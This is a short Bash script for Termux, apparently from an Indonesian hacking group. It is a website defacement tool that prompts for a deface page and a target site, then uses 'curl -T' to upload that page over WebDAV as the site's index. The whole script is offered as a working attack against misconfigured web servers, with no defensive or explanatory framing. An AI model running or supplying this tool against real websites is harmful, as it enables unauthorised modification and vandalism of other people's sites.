#!bin/bash
#webdav

figlet webdav
echo "========================="
echo "Tolls By Tn.Kuuhaku"
echo "Team:Society Cyber Squad"
echo "Thanks to : All Freinds"
echo "========================="
echo ""
echo "Script Depes harus di luar memori internal"
echo "Nama script di ganti menjadi Index.html"
read -p "Masukan Nama script deface: " script;
read -p "Masukan Web deface: " web;
sleep 4
echo "Tunggu......"
sleep 2
termux-setup-storage
curl -T /storage/emulated/0/$script $web
echo "Succes"
